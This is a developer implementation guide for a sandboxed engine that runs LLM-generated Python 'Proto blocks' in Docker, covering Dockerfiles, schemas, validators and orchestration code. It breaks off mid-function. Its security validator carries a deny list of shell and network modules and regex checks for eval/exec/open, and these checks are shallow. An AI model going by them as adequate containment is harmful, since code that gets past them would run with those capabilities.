# ProtoEngine Implementation Guide for NIREON V4

## Context: Dual-Plane Execution Architecture

NIREON V4 operates on two complementary execution planes:
- **Mechanism Plane**: The existing MechanismGateway handles in-process components (Explorer, Catalyst, etc.) for static, trusted operations
- **Proto Plane**: The new ProtoEngine introduces out-of-process, sandboxed execution for dynamic, declarative tasks requiring high security and isolation

This guide focuses on implementing the Proto Plane while maintaining clean integration with the existing Mechanism infrastructure.

## Executive Summary

**ProtoEngine** is a declarative-to-executable transformation system within the NIREON architecture. It receives structured cognitive intent in the form of `Proto` blocks (YAML), validates them, synthesizes runnable code, and executes that code in a secure, isolated containerized environment.

This engine is **domain-agnostic** — it is not a math engine, proof engine, or graph engine per se. It is a **generic execution substrate** for Proto-based reasoning tasks. Each Proto dialect (`eidos: math`, `eidos: graph`, etc.) can be routed through the **ProtoGateway** to its corresponding container implementation, enabling composable, secure, reproducible cognitive workflows.

### What It Does

- Accepts ProtoBlock YAML (structured declarations of task, input, limits, intent)
- Validates the block against schema and security rules
- Executes the code inside a secure Docker container with resource limits derived from the active NIREON Frame
- Emits structured result output, including artifacts if applicable

### Naming Clarification

- `ProtoBlock`: A raw declarative unit (YAML) before typing
- `ProtoGenerator`: An LLM-powered component that translates natural language into a ProtoBlock
- `ProtoGateway`: A component that routes ProtoTaskSignals to the correct engine based on the `eidos` dialect
- `ProtoEngine`: The NIREON component responsible for orchestrating the execution of a ProtoBlock in a sandboxed environment (e.g., a Docker container)
- `ProtoResultSignal`: The response from container execution
- `eidos`: Dialect label for the Proto, e.g. `math`, `graph`, `simulation`

### Example Dialect Specializations

| Dialect (`eidos`) | Orchestrating Component | Docker Image Name |
|------------------|-------------------------|-------------------|
| `math` | `proto_engine_math` | `nireon-proto-math-runner` |
| `graph` | `proto_engine_graph` | `nireon-proto-graph-runner` |
| `simulate` | `proto_engine_simulate` | `nireon-proto-sim-runner` |

This pattern is extensible and declarative. New Proto engines can be added by plugging in validators and Docker images — no changes to the core system required.

## Phase 0: Prerequisite NIREON Subsystems (Frame & Budget)

The ProtoEngine relies heavily on two existing NIREON subsystems for context and resource management.

### FrameFactoryService (Policy & Context Layer)

This service manages the "rules of engagement" for any given task by creating Frame objects. Its key functions are:

- `create_frame()`: Instantiates a new, scoped context for a task, defining its `epistemic_goals`, `llm_policy`, and `resource_budget`
- `spawn_sub_frame()`: Creates a child task that inherits context from a parent, crucial for multi-step reasoning
- `get_frame_by_id()`: Retrieves the policy context for a given task ID, allowing the ProtoEngine to look up the rules for the task it's executing
- `update_frame_status()`: Manages the lifecycle of a task (active, completed_ok, error, etc.)

### BudgetManager (Resource Accounting & Enforcement Layer)

This service ensures that the resource policies defined in a Frame are enforced.

- `initialize_frame_budget()`: Loads the resource limits from a Frame into the active budget pool
- `consume_resource_or_raise()`: The core enforcement function. The ProtoEngine must call this before launching an external process to decrement the budget for resources like `proto_cpu_seconds` or `proto_executions`. If the budget is insufficient, this raises an error, preventing the task from running

## Prerequisites
- NIREON V4 system with working ComponentRegistry, EventBus, Reactor, FrameFactoryService, and BudgetManager
- Python 3.12+ environment with Docker support
- Docker installed and running for containerized execution
- Understanding of NIREON's signal-based architecture and Proto-based epistemic model

## Docker Image Setup

Before deploying the ProtoEngine with Docker execution mode, you need to build the container images for each dialect.

### Base Proto Runner Image

**Location:** `docker/proto-base/Dockerfile`

```dockerfile
# Use a slim, secure base image
FROM python:3.12-slim

# Security: Create a non-root user for execution
RUN useradd -m -u 1000 protorunner

# Install a small set of common, trusted packages
RUN pip install --no-cache-dir \
    numpy==1.26.4 \
    pandas==2.2.2 \
    matplotlib==3.8.4 \
    scipy==1.13.0

# Create and set permissions for the app directory
WORKDIR /app
RUN chown protorunner:protorunner /app

# Switch to the non-root user
USER protorunner

# Default entrypoint for the container
CMD ["python", "-I", "/app/execute.py"]
```

### Math Dialect Image

**Location:** `docker/proto-math/Dockerfile`

```dockerfile
# Layer on top of the base image
FROM nireon-proto-base:latest

# Install additional math-specific packages
RUN pip install --no-cache-dir \
    sympy==1.12 \
    statsmodels==0.14.1 \
    seaborn==0.13.2

# Optional: Environment variable for introspection
ENV PROTO_DIALECT=math
```

### Build Commands

```bash
# Build the base image first
docker build -t nireon-proto-base:latest -f docker/proto-base/Dockerfile .

# Build dialect-specific images
docker build -t nireon-proto-math:latest -f docker/proto-math/Dockerfile .
# docker build -t nireon-proto-graph:latest -f docker/proto-graph/Dockerfile .
# docker build -t nireon-proto-simulate:latest -f docker/proto-simulate/Dockerfile .
```

## Implementation Phases

### Phase 1: Core Infrastructure (Week 1-2)

#### 1.1 Proto Schema Definition

**Location:** `nireon_v4/domain/proto/`

For better organization with multiple dialects:
- `nireon_v4/domain/proto/base_schema.py` - Base ProtoBlock class
- `nireon_v4/domain/proto/math/schema.py` - Math-specific Proto schemas  
- `nireon_v4/domain/proto/graph/schema.py` - Graph-specific Proto schemas
- `nireon_v4/domain/proto/validation.py` - Validation framework

**File:** `base_schema.py`

```python
from pydantic import BaseModel, Field, validator
from typing import Dict, Any, List, Optional, Literal, Union
from datetime import datetime
import ast

class ProtoBlock(BaseModel):
    """Base Proto schema for all epistemic dialects."""
    schema_version: str = Field(default="proto/1.0", description="Proto schema version")
    id: str = Field(..., description="Unique identifier for this Proto block")
    eidos: str = Field(..., description="Dialect identifier (math, graph, simulate, etc.)")
    description: str = Field(..., description="Human-readable description")
    objective: str = Field(..., description="What this analysis aims to achieve")
    
    # Core execution parameters
    function_name: str = Field(..., description="Entry point function name in the code")
    code: str = Field(..., description="Code to execute (language depends on eidos)")
    inputs: Dict[str, Any] = Field(default_factory=dict, description="Input parameters")
    
    # Execution constraints
    limits: Dict[str, Any] = Field(default_factory=lambda: {"timeout_sec": 10, "memory_mb": 256})
    
    # Metadata
    metadata: Optional[Dict[str, Any]] = Field(default_factory=dict)
    context: Dict[str, Any] = Field(default_factory=dict)
    requirements: List[str] = Field(default_factory=list, description="Package requirements")
    
    @validator('id')
    def validate_id(cls, v):
        # Ensure ID follows naming convention
        if not v.replace('_', '').replace('-', '').isalnum():
            raise ValueError("ID must contain only alphanumeric characters, hyphens, and underscores")
        return v
    
    @validator('code')
    def validate_code_structure(cls, v, values):
        function_name = values.get('function_name')
        eidos = values.get('eidos')
        
        # Use AST-based validation for robustness
        if function_name:
            try:
                tree = ast.parse(v)
                function_found = False
                for node in ast.walk(tree):
                    if isinstance(node, ast.FunctionDef) and node.name == function_name:
                        function_found = True
                        break
                
                if not function_found:
                    raise ValueError(f"Code must define function '{function_name}'")
            except SyntaxError as e:
                raise ValueError(f"Code contains syntax errors: {e}")
        
        return v
    
    class Config:
        extra = "forbid"

class ProtoMathBlock(ProtoBlock):
    """Specialized Proto block for mathematical dialect."""
    eidos: Literal['math'] = 'math'
    
    # Math-specific metadata
    equation_latex: Optional[str] = Field(default=None, description="LaTeX representation of key equations")
    
    # Override default limits for math
    limits: Dict[str, Any] = Field(default_factory=lambda: {
        "timeout_sec": 10, 
        "memory_mb": 256,
        "allowed_imports": ["matplotlib.pyplot", "numpy", "pandas", "scipy", "sympy", "math", "statistics"]
    })

class ProtoGraphBlock(ProtoBlock):
    """Specialized Proto block for graph analysis dialect."""
    eidos: Literal['graph'] = 'graph'
    
    # Graph-specific metadata
    graph_format: Optional[str] = Field(default="networkx", description="Graph library format")
    
    limits: Dict[str, Any] = Field(default_factory=lambda: {
        "timeout_sec": 20,
        "memory_mb": 512,
        "allowed_imports": ["networkx", "numpy", "matplotlib.pyplot", "pandas"]
    })

# Additional dialect blocks can be added here...
```

**File:** `validation.py`

```python
import ast
import re
from typing import List, Set, Dict, Type
from abc import ABC, abstractmethod
from .base_schema import ProtoBlock, ProtoMathBlock, ProtoGraphBlock

class ProtoValidator(ABC):
    """Abstract base validator for Proto blocks."""
    
    @abstractmethod
    def validate(self, proto: ProtoBlock) -> List[str]:
        """Validate a Proto block. Returns list of errors."""
        pass

class SecurityValidator(ProtoValidator):
    """Universal security validator for all Proto dialects."""
    
    # Security: Dangerous imports/functions to block universally
    BLOCKED_IMPORTS = {
        'os', 'subprocess', 'sys', 'shutil', 'socket', 'urllib', 'requests',
        'pickle', 'eval', 'exec', 'open', '__import__', 'compile'
    }
    
    def validate(self, proto: ProtoBlock) -> List[str]:
        """Perform security validation on any Proto block."""
        errors = []
        
        # Validate code syntax
        try:
            ast.parse(proto.code)
        except SyntaxError as e:
            errors.append(f"Syntax error in code: {e}")
            return errors  # Don't continue if syntax is broken
        
        # Security validation
        errors.extend(self._validate_security(proto))
        
        # Resource limits validation
        if proto.limits.get('timeout_sec', 0) > 30:
            errors.append("Timeout cannot exceed 30 seconds")
        
        if proto.limits.get('memory_mb', 0) > 1024:
            errors.append("Memory limit cannot exceed 1024 MB")
        
        return errors
    
    def _validate_security(self, proto: ProtoBlock) -> List[str]:
        """Check for security violations in code."""
        errors = []
        
        # Check for blocked imports
        tree = ast.parse(proto.code)
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for name in node.names:
                    if name.name in self.BLOCKED_IMPORTS:
                        errors.append(f"Blocked import: {name.name}")
            elif isinstance(node, ast.ImportFrom):
                if node.module and node.module.split('.')[0] in self.BLOCKED_IMPORTS:
                    errors.append(f"Blocked import: {node.module}")
        
        # Check for dangerous function calls
        dangerous_patterns = [
            r'open\s*\(',
            r'eval\s*\(',
            r'exec\s*\(',
            r'__import__\s*\(',
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, proto.code):
                errors.append(f"Dangerous pattern detected: {pattern}")
        
        return errors

class MathProtoValidator(ProtoValidator):
    """Validator specific to math dialect Proto blocks."""
    
    ALLOWED_IMPORTS = {
        'matplotlib.pyplot', 'numpy', 'pandas', 'math', 'statistics',
        'scipy', 'sympy', 'datetime', 'json', 'csv'
    }
    
    def __init__(self):
        self.security_validator = SecurityValidator()
    
    def validate(self, proto: ProtoMathBlock) -> List[str]:
        """Validate a math Proto block."""
        errors = []
        
        # First run security validation
        errors.extend(self.security_validator.validate(proto))
        
        # Math-specific validation
        if not self._function_exists(proto.code, proto.function_name):
            errors.append(f"Function '{proto.function_name}' not found in code")
        
        # Check allowed imports for math
        allowed = set(proto.limits.get('allowed_imports', self.ALLOWED_IMPORTS))
        used_imports = self._get_imports(proto.code)
        
        for imp in used_imports:
            if not any(imp.startswith(allowed_imp) for allowed_imp in allowed):
                errors.append(f"Import '{imp}' not in allowed list for math dialect")
        
        return errors
    
    def _function_exists(self, code: str, function_name: str) -> bool:
        """Check if the specified function exists in the code."""
        try:
            tree = ast.parse(code)
            for node in ast.walk(tree):
                if isinstance(node, ast.FunctionDef) and node.name == function_name:
                    return True
        except:
            pass
        return False
    
    def _get_imports(self, code: str) -> Set[str]:
        """Extract all imports from code."""
        imports = set()
        try:
            tree = ast.parse(code)
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        imports.add(alias.name)
                elif isinstance(node, ast.ImportFrom):
                    if node.module:
                        imports.add(node.module)
        except:
            pass
        return imports

# Validator registry for different dialects
DIALECT_VALIDATORS: Dict[str, Type[ProtoValidator]] = {
    'math': MathProtoValidator,
    # TODO: Add when implementing graph dialect
    # 'graph': GraphProtoValidator,
    # TODO: Add when implementing simulate dialect  
    # 'simulate': SimulationProtoValidator,
}

def get_validator_for_dialect(eidos: str) -> ProtoValidator:
    """Get the appropriate validator for a Proto dialect."""
    validator_class = DIALECT_VALIDATORS.get(eidos)
    if not validator_class:
        # Fall back to security-only validation for unknown dialects (safe by default)
        return SecurityValidator()
    return validator_class()
```

#### 1.2 New Signal Types

**Location:** `nireon_v4/signals/core.py` (add to existing file)

```python
class ProtoTaskSignal(EpistemicSignal):
    """Signal carrying a Proto block for type expansion and execution."""
    signal_type: Literal['ProtoTaskSignal'] = 'ProtoTaskSignal'
    proto_block: Dict[str, Any] = Field(description="The Proto block to execute")
    execution_priority: int = Field(default=5, description="Execution priority (1-10)")
    dialect: str = Field(description="Proto dialect (eidos value)")
    context_tags: Dict[str, Any] = Field(default_factory=dict, description="Context metadata including frame_id")

class ProtoResultSignal(EpistemicSignal):
    """Signal carrying execution results from any Proto dialect."""
    signal_type: Literal['ProtoResultSignal'] = 'ProtoResultSignal'
    proto_block_id: str = Field(description="ID of the executed Proto block")
    dialect: str = Field(description="Proto dialect that was executed")
    success: bool = Field(description="Whether execution succeeded")
    result: Any = Field(description="Execution result")
    artifacts: List[str] = Field(default_factory=list, description="Generated artifact paths")
    execution_time_sec: float = Field(description="Execution duration")
    metadata: Dict[str, Any] = Field(default_factory=dict)

class ProtoErrorSignal(EpistemicSignal):
    """Signal indicating Proto execution failure."""
    signal_type: Literal['ProtoErrorSignal'] = 'ProtoErrorSignal'
    proto_block_id: str = Field(description="ID of the failed Proto block")
    dialect: str = Field(description="Proto dialect that failed")
    error_type: str = Field(description="Type of error (validation, execution, timeout)")
    error_message: str = Field(description="Detailed error message")
    execution_context: Dict[str, Any] = Field(default_factory=dict)

# Dialect-specific result signals can extend the base
class MathProtoResultSignal(ProtoResultSignal):
    """Math-specific result signal with additional fields."""
    dialect: Literal['math'] = 'math'
    equation_latex: Optional[str] = Field(default=None)
    numeric_result: Optional[Union[float, List[float], Dict[str, float]]] = Field(default=None)
```

#### 1.3 Configuration Models

**Location:** `nireon_v4/proto_engine/config.py`

```python
from pydantic import BaseModel, Field, validator
from typing import List, Dict, Any, Optional
from pathlib import Path

class ProtoEngineConfig(BaseModel):
    """Configuration for the ProtoEngine mechanism."""
    
    # Execution environment - Default to Docker for robust, cross-platform sandboxing
    execution_mode: str = Field(default="docker", description="Execution mode: docker or subprocess")
    python_executable: str = Field(default="python", description="Python executable for subprocess mode")
    docker_image_prefix: str = Field(default="nireon-proto", description="Docker image prefix for containers")
    
    # Working directories
    work_directory: str = Field(default="runtime/proto/workspace", description="Working directory for executions")
    artifacts_directory: str = Field(default="runtime/proto/artifacts", description="Directory for output artifacts")
    
    # Security limits (defaults from security research best practices)
    default_timeout_sec: int = Field(default=10, ge=1, le=30)
    default_memory_mb: int = Field(default=256, ge=64, le=1024)
    max_file_size_mb: int = Field(default=10, ge=1, le=50)
    
    # Dialect-specific settings
    dialect_configs: Dict[str, Dict[str, Any]] = Field(default_factory=dict)
    
    # Monitoring and cleanup
    cleanup_after_execution: bool = Field(default=True)
    retain_artifacts_hours: int = Field(default=24, ge=1, le=168)  # Max 1 week
    
    # Integration settings
    event_bus_timeout_sec: int = Field(default=30)
    
    @validator('work_directory', 'artifacts_directory')
    def ensure_directory_exists(cls, v):
        Path(v).mkdir(parents=True, exist_ok=True)
        return v
    
    def get_dialect_config(self, dialect: str) -> Dict[str, Any]:
        """Get configuration specific to a dialect."""
        return self.dialect_configs.get(dialect, {})
    
    class Config:
        extra = "forbid"

class ProtoMathEngineConfig(ProtoEngineConfig):
    """Configuration specific to math dialect execution."""
    
    # Math-specific package allowlist
    allowed_packages: List[str] = Field(
        default_factory=lambda: [
            "matplotlib", "numpy", "pandas", "scipy", "sympy", 
            "seaborn", "plotly", "statsmodels"
        ]
    )
    
    # Math-specific execution settings
    enable_latex_rendering: bool = Field(default=True)
    plot_dpi: int = Field(default=150)
    
    def __init__(self, **data):
        super().__init__(**data)
        # Set math-specific dialect config
        self.dialect_configs['math'] = {
            'allowed_packages': self.allowed_packages,
            'enable_latex': self.enable_latex_rendering,
            'plot_dpi': self.plot_dpi
        }
```

### Phase 2: The ProtoBlock Generator (Week 2)

This component is the human-to-machine interface for the ProtoPlane.

**Location:** `nireon_v4/proto_generator/service.py`

```python
from typing import Dict, Any, List
import yaml
import json

from nireon_v4.application.components.base import NireonBaseComponent
from nireon_v4.application.context import ExecutionContext
from nireon_v4.application.components.lifecycle import ProcessResult
from nireon_v4.signals.core import ProtoTaskSignal
from nireon_v4.domain.proto.base_schema import ProtoBlock
from nireon_v4.domain.proto.validation import get_validator_for_dialect

class ProtoGenerator(NireonBaseComponent):
    """
    Generates Proto blocks from natural language requests using LLM.
    
    This component can generate Proto blocks for any supported dialect,
    making it the entry point for declarative task specification.
    """
    
    PROTO_GENERATION_PROMPT = """
You are a Proto block generator for the NIREON ProtoEngine system.
Generate executable Proto blocks based on the user's request.

Proto blocks are declarative specifications that get executed in secure containers.
The 'eidos' field determines the dialect and execution environment.

Available dialects:
- math: Mathematical computations, plotting, numerical analysis
- graph: Network analysis, graph algorithms, visualization
- simulate: Discrete event simulation, Monte Carlo methods

Proto Block Schema:
```yaml
schema_version: proto/1.0
eidos: {dialect}
id: UNIQUE_ID_HERE
description: "Brief description"
objective: "What this analysis achieves"
function_name: main_function
inputs:
  param1: value1
  param2: value2
code: |
  # Import statements based on dialect
  
  def main_function(param1, param2):
      # Your implementation here
      return result

requirements: []  # Optional: additional packages needed
limits:
  timeout_sec: 10
  memory_mb: 256
```

Dialect-specific guidelines:
- math: Use numpy, scipy, matplotlib. Can include equation_latex field.
- graph: Use networkx for graph operations. Return graph metrics or visualizations.
- simulate: Use simpy or custom logic. Return simulation results.

User Request: {user_request}
Suggested Dialect: {suggested_dialect}

Generate a complete Proto block:
"""

    def __init__(self, instance_id: str, config: Dict[str, Any], **kwargs):
        super().__init__(instance_id, config, **kwargs)
        self.supported_dialects = config.get('supported_dialects', ['math', 'graph', 'simulate'])
        self.default_dialect = config.get('default_dialect', 'math')
    
    async def process(self, data: Any, context: ExecutionContext) -> ProcessResult:
        """Generate Proto block from natural language request."""
        
        try:
            user_request = data.get('natural_language_request', '')
            suggested_dialect = data.get('dialect', self._infer_dialect(user_request))
            
            # IMPORTANT: Capture the frame_id from the context of the incoming request
            originating_frame_id = context.metadata.get('frame_id')
            
            if not user_request:
                return ProcessResult(
                    success=False,
                    message="No natural language request provided",
                    component_id=self.instance_id
                )
            
            # Get LLM service
            llm_service = context.component_registry.get_service_instance("llm_router")
            if not llm_service:
                return ProcessResult(
                    success=False,
                    message="LLM service not available",
                    component_id=self.instance_id
                )
            
            # Generate Proto block
            prompt = self.PROTO_GENERATION_PROMPT.format(
                dialect=suggested_dialect,
                user_request=user_request,
                suggested_dialect=suggested_dialect
            )
            
            llm_response = await llm_service.call_llm_async(
                prompt=prompt,
                temperature=0.3,  # Lower temperature for more consistent code
                max_tokens=2000
            )
            
            # Parse YAML response
            try:
                proto_data = yaml.safe_load(llm_response.text)
            except yaml.YAMLError as e:
                return ProcessResult(
                    success=False,
                    message=f"Failed to parse LLM response as YAML: {e}",
                    component_id=self.instance_id
                )
            
            # Type expansion and validation
            typed_proto = self._expand_proto_type(proto_data, suggested_dialect)
            if isinstance(typed_proto, str):  # Error message
                return ProcessResult(
                    success=False,
                    message=typed_proto,
                    component_id=self.instance_id
                )
            
            # Validate generated Proto block
            validator = get_validator_for_dialect(suggested_dialect)
            validation_errors = validator.validate(typed_proto)
            
            if validation_errors:
                return ProcessResult(
                    success=False,
                    message=f"Generated Proto block failed validation: {'; '.join(validation_errors)}",
                    component_id=self.instance_id
                )
            
            # Emit Proto task signal
            proto_signal = ProtoTaskSignal(
                source_node_id=self.instance_id,
                proto_block=proto_data,
                dialect=suggested_dialect,
                execution_priority=5,
                # CRITICAL: Pass the frame_id along for budget and context tracking
                context_tags={'frame_id': originating_frame_id} if originating_frame_id else {}
            )
            
            await context.event_bus.publish(proto_signal.signal_type, proto_signal.dict())
            
            return ProcessResult(
                success=True,
                message=f"Generated and queued Proto block: {proto_data['id']} (dialect: {suggested_dialect})",
                component_id=self.instance_id,
                output_data={"proto_block": proto_data}
            )
            
        except Exception as e:
            self.logger.error(f"Error in Proto generation: {e}", exc_info=True)
            return ProcessResult(
                success=False,
                message=f"Proto generation failed: {e}",
                component_id=self.instance_id
            )
    
    def _infer_dialect(self, request: str) -> str:
        """Infer the most appropriate dialect from the request."""
        request_lower = request.lower()
        
        # Simple keyword-based inference
        if any(word in request_lower for word in ['plot', 'graph', 'visualize', 'equation', 'calculate', 'integral']):
            return 'math'
        elif any(word in request_lower for word in ['network', 'nodes', 'edges', 'shortest path', 'connected']):
            return 'graph'
        elif any(word in request_lower for word in ['simulate', 'simulation', 'monte carlo', 'random']):
            return 'simulate'
        
        return self.default_dialect
    
    def _expand_proto_type(self, proto_data: Dict[str, Any], dialect: str) -> Union[ProtoBlock, str]:
        """Expand raw Proto data into typed Proto based on dialect."""
        try:
            if dialect == 'math':
                from nireon_v4.domain.proto.base_schema import ProtoMathBlock
                return ProtoMathBlock(**proto_data)
            elif dialect == 'graph':
                from nireon_v4.domain.proto.base_schema import ProtoGraphBlock
                return ProtoGraphBlock(**proto_data)
            else:
                # Generic Proto block for unknown dialects
                return ProtoBlock(**proto_data)
        except Exception as e:
            return f"Proto type expansion failed for dialect '{dialect}': {e}"
```

### Phase 3: The ProtoEngine Component (Week 3-4)

This phase implements the "Project Manager" component that lives inside NIREON and orchestrates the sandboxed execution.

#### 3.1 ProtoGateway Implementation

**Location:** `nireon_v4/proto_engine/service.py`

```python
import asyncio
import subprocess
import tempfile
import uuid
import json
import shutil
import time
import docker  # Add this dependency
from pathlib import Path
from typing import Dict, Any, List, Optional, Type, Union
from concurrent.futures import ProcessPoolExecutor, TimeoutError
from abc import ABC, abstractmethod

from nireon_v4.application.components.base import NireonBaseComponent
from nireon_v4.application.context import ExecutionContext
from nireon_v4.application.components.lifecycle import ProcessResult, ComponentHealth
from nireon_v4.application.services.budget_manager import BudgetExceededError
from nireon_v4.signals.core import ProtoResultSignal, ProtoErrorSignal, MathProtoResultSignal, ProtoTaskSignal
from nireon_v4.domain.proto.base_schema import ProtoBlock, ProtoMathBlock
from nireon_v4.domain.proto.validation import get_validator_for_dialect

from .config import ProtoEngineConfig
from .executors import SubprocessExecutor, DockerExecutor

class ProtoGateway:
    """
    Lightweight dispatcher for Proto blocks.
    
    Routes ProtoTaskSignal payloads to the correct ProtoEngine instance
    based on the Proto block's dialect (`eidos`). Mirrors the existing
    MechanismGateway pattern but operates on out-of-process Proto engines.
    """

    def __init__(self, registry, dialect_to_component: Dict[str, str]):
        """
        Args:
            registry: ComponentRegistry used to fetch ProtoEngine instances
            dialect_to_component: Maps `eidos` strings → component_id of the target ProtoEngine
                Example: {"math": "proto_engine_math", "graph": "proto_engine_graph"}
        """
        self.registry = registry
        self.dialect_map = dialect_to_component

    async def handle(self, signal: ProtoTaskSignal, ctx: ExecutionContext):
        """Entry-point subscribed to ProtoTaskSignal events."""
        proto = signal.proto_block
        dialect = proto.get("eidos", "unknown")

        component_id = self.dialect_map.get(dialect)
        if not component_id:
            await self._emit_routing_error(signal, dialect, ctx)
            return

        engine = self.registry.get_service_instance(component_id)
        if not engine:
            await self._emit_routing_error(signal, dialect, ctx, "component_not_found")
            return

        # Forward to the engine and bubble up its ProcessResult if needed
        await engine.process({"proto_block": proto, "dialect": dialect}, ctx)

    async def _emit_routing_error(
        self,
        signal: ProtoTaskSignal,
        dialect: str,
        ctx: ExecutionContext,
        code: str = "no_engine_for_dialect",
    ):
        err = ProtoErrorSignal(
            source_node_id="proto_gateway",
            proto_block_id=signal.proto_block.get("id", "unknown"),
            dialect=dialect,
            error_type=code,
            error_message=f"ProtoGateway has no target for dialect '{dialect}'",
        )
        await ctx.event_bus.publish(err.signal_type, err.dict())

class ProtoEngine(NireonBaseComponent):
    """
    NIREON component for orchestrating the execution of typed Proto blocks
    in a secure, sandboxed environment. This is the "Project Manager".
    
    This is a domain-agnostic execution engine that can handle any Proto dialect
    by routing to appropriate executors and validators.
    """
    
    def __init__(self, instance_id: str, config: ProtoEngineConfig, **kwargs):
        super().__init__(instance_id, config, **kwargs)
        self.config: ProtoEngineConfig = config
        self._executors: Dict[str, Any] = {}
        self._initialize_executors()
        # These will be injected by the system
        self.frame_factory = None
        self.budget_manager = None
    
    def _initialize_executors(self):
        """Initialize execution backends based on configuration."""
        if self.config.execution_mode == "subprocess":
            self._executors['default'] = SubprocessExecutor(self.config)
        elif self.config.execution_mode == "docker":
            self._executors['default'] = DockerExecutor(self.config)
        
        # Dialect-specific executors can be registered here
        # self._executors['math'] = MathSpecificExecutor(self.config)
    
    async def initialize(self, context: ExecutionContext) -> None:
        """Initialize the proto engine."""
        await super().initialize(context)
        
        # Ensure directories exist
        Path(self.config.work_directory).mkdir(parents=True, exist_ok=True)
        Path(self.config.artifacts_directory).mkdir(parents=True, exist_ok=True)
        
        # Get references to Frame and Budget services during initialization
        self.frame_factory = context.component_registry.get_service_instance("frame_factory")
        self.budget_manager = context.component_registry.get_service_instance("budget_manager")
        
        if not self.frame_factory:
            self.logger.warning("FrameFactoryService not available - budget enforcement will be skipped")
        if not self.budget_manager:
            self.logger.warning("BudgetManager not available - resource limits will not be enforced")
        
        self.logger.info(f"ProtoEngine '{self.instance_id}' initialized in {self.config.execution_mode} mode and linked to core services")
    
    async def process(self, data: Any, context: ExecutionContext) -> ProcessResult:
        """Process a ProtoTaskSignal - performs type expansion, budget enforcement, and execution."""
        
        try:
            # --- 1. Receive and Validate Task ---
            if isinstance(data, dict) and 'proto_block' in data:
                proto_data = data['proto_block']
                dialect = data.get('dialect') or proto_data.get('eidos', 'unknown')
            else:
                return ProcessResult(
                    success=False,
                    message="Invalid input: expected Proto block data",
                    component_id=self.instance_id
                )
            
            # Type Expansion: Create appropriate Proto type based on dialect
            typed_proto = self._expand_proto_type(proto_data, dialect)
            if isinstance(typed_proto, str):  # Error message
                await self._emit_error_signal(
                    proto_data.get('id', 'unknown'),
                    dialect,
                    'type_expansion',
                    typed_proto,
                    context
                )
                return ProcessResult(
                    success=False,
                    message=typed_proto,
                    component_id=self.instance_id
                )
            
            # --- 2. Get Frame context and Enforce Budget ---
            # The originating frame_id should be in the signal's context_tags
            frame_id = None
            if hasattr(context, 'signal') and context.signal:
                frame_id = context.signal.context_tags.get('frame_id')
            if not frame_id:
                frame_id = context.metadata.get('frame_id')  # Fallback
                
            if frame_id and self.frame_factory and self.budget_manager:
                frame = await self.frame_factory.get_frame_by_id(context, frame_id)
                if not frame:
                    return ProcessResult(
                        success=False,
                        message=f"Frame {frame_id} not found.",
                        component_id=self.instance_id
                    )
                
                try:
                    # Consume resources BEFORE execution
                    timeout = typed_proto.limits.get('timeout_sec', self.config.default_timeout_sec)
                    await self.budget_manager.consume_resource_or_raise(frame.id, 'proto_executions', 1)
                    await self.budget_manager.consume_resource_or_raise(frame.id, 'proto_cpu_seconds', timeout)
                except BudgetExceededError as e:
                    await self._emit_error_signal(
                        typed_proto.id,
                        dialect,
                        'budget_exceeded',
                        str(e),
                        context
                    )
                    return ProcessResult(
                        success=False,
                        message=f"Budget exceeded: {e}",
                        component_id=self.instance_id
                    )
                except KeyError:
                    self.logger.warning(f"No proto budget defined for frame {frame.id}. Proceeding without check.")
            else:
                self.logger.warning("No frame_id provided or Frame/Budget services unavailable. Proceeding without budget enforcement.")
            
            # --- 3. Run Validator ---
            validator = get_validator_for_dialect(dialect)
            validation_errors = validator.validate(typed_proto)
            
            if validation_errors:
                error_msg = "; ".join(validation_errors)
                await self._emit_error_signal(
                    typed_proto.id,
                    dialect,
                    'validation',
                    f"Validation failed: {error_msg}",
                    context
                )
                return ProcessResult(
                    success=False,
                    message=f"Validation failed: {error_msg}",
                    component_id=self.instance_id
                )
            
            # --- 4. Launch Sandboxed Worker ---
            executor = self._get_executor_for_dialect(dialect)
            result = await executor.execute(typed_proto, context)
            
            # --- 5. Process Results & Emit Signals ---
            if result['success']:
                # Emit dialect-specific result signal
                await self._emit_result_signal(typed_proto, result, context)
                
                return ProcessResult(
                    success=True,
                    message=f"Successfully executed Proto block {typed_proto.id} (dialect: {dialect})",
                    component_id=self.instance_id,
                    output_data=result
                )
            else:
                # Emit error signal
                await self._emit_error_signal(
                    typed_proto.id,
                    dialect,
                    'execution',
                    result.get('error', 'Unknown execution error'),
                    context
                )
                return ProcessResult(
                    success=False,
                    message=f"Execution failed: {result.get('error')}",
                    component_id=self.instance_id,
                    output_data=result
                )
        
        except Exception as e:
            self.logger.error(f"Unexpected error in ProtoEngine: {e}", exc_info=True)
            return ProcessResult(
                success=False,
                message=f"Unexpected error: {e}",
                component_id=self.instance_id
            )
    
    def _expand_proto_type(self, proto_data: Dict[str, Any], dialect: str) -> Union[ProtoBlock, str]:
        """Expand raw Proto data into typed Proto based on dialect."""
        try:
            if dialect == 'math':
                return ProtoMathBlock(**proto_data)
            elif dialect == 'graph':
                # return ProtoGraphBlock(**proto_data)
                return ProtoBlock(**proto_data)  # Fallback for now
            else:
                # Generic Proto block for unknown dialects
                return ProtoBlock(**proto_data)
        except Exception as e:
            return f"Proto type expansion failed for dialect '{dialect}': {e}"
    
    def _get_executor_for_dialect(self, dialect: str):
        """Get the appropriate executor for a dialect."""
        # Return dialect-specific executor if available, otherwise default
        return self._executors.get(dialect, self._executors['default'])
    
    async def _emit_result_signal(self, typed_proto: ProtoBlock, result: Dict[str, Any], context: ExecutionContext):
        """Emit appropriate result signal based on dialect."""
        
        base_data = {
            'source_node_id': self.instance_id,
            'proto_block_id': typed_proto.id,
            'dialect': typed_proto.eidos,
            'success': True,
            'result': result.get('result'),
            'artifacts': result.get('artifacts', []),
            'execution_time_sec': result.get('execution_time_sec', 0),
            'metadata': {
                'function_name': typed_proto.function_name,
                'objective': typed_proto.objective
            }
        }
        
        # Create dialect-specific signal
        if typed_proto.eidos == 'math' and isinstance(typed_proto, ProtoMathBlock):
            signal = MathProtoResultSignal(
                **base_data,
                equation_latex=typed_proto.equation_latex,
                numeric_result=result.get('result')
            )
        else:
            signal = ProtoResultSignal(**base_data)
        
        if hasattr(context, 'event_bus') and context.event_bus:
            await context.event_bus.publish(signal.signal_type, signal.dict())
    
    async def _emit_error_signal(self, proto_id: str, dialect: str, error_type: str, 
                                error_message: str, context: ExecutionContext):
        """Emit ProtoErrorSignal for failed execution."""
        
        signal = ProtoErrorSignal(
